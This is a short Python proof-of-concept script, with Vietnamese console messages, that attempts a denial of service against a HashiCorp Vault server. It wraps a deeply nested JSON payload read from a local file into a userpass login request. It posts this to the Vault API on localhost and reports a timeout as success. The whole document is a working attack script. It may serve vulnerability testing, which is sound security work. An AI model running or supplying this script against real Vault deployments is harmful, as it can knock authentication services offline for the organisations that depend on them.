import requests
import sys
import time

VAULT_ADDR = "https://localhost:8222"
USERNAME = "test-user"
LOGIN_PATH = f"auth/userpass/login/{USERNAME}"
REQUEST_TIMEOUT = 10

def run_dos_attack():
    print("="*50)
    print("Thử nghiệm lỗ hổng DoS trên Vault")
    print(f"Mục tiêu: {VAULT_ADDR}/v1/{LOGIN_PATH}")
    print("="*50)

    try:
        with open("payload.json", 'r') as f:
            deep_payload_str = f.read()
        print("[+] Đã đọc thành công 'payload.json'.")
    except FileNotFoundError:
        print("[!] LỖI: Không tìm thấy tệp 'payload.json'.")
        return
    except Exception as e:
        print(f"[!] Lỗi khi đọc tệp payload: {e}")
        return

    final_payload_str = f'''
    {{
        "password": "dummy_new",
        "extra_complex_data": {deep_payload_str}
    }}
    '''

    payload_size_kb = len(final_payload_str.encode('utf-8')) / 1024
    print(f"    Kích thước payload: {payload_size_kb:.2f} KB")

    headers = {"Content-Type": "application/json"}

    print(f"\n[*] Gửi request POST tới {VAULT_ADDR}/v1/{LOGIN_PATH}...")
    
    start_time = time.time()

    try:
        response = requests.post(
            f"{VAULT_ADDR}/v1/{LOGIN_PATH}",
            headers=headers,
            data=final_payload_str,
            timeout=REQUEST_TIMEOUT
        )
        
        elapsed_time = time.time() - start_time
        print(f"\n[+] Máy chủ đã phản hồi!")
        print(f"    Thời gian thực thi: {elapsed_time:.4f} giây")
        print(f"    Status Code: {response.status_code}")
        print(f"    Response Body (500 chars): {response.text[:500]}")

    except requests.exceptions.Timeout:
        elapsed_time = time.time() - start_time
        print("\n[!!!] THÀNH CÔNG (TIMEOUT)!")
        print(f"    Thời gian thực thi thực tế: {elapsed_time:.4f} giây")
    except requests.exceptions.RequestException as e:
        elapsed_time = time.time() - start_time
        print(f"\n[!] Đã xảy ra lỗi request sau {elapsed_time:.4f} giây: {e}")

if __name__ == "__main__":
    run_dos_attack()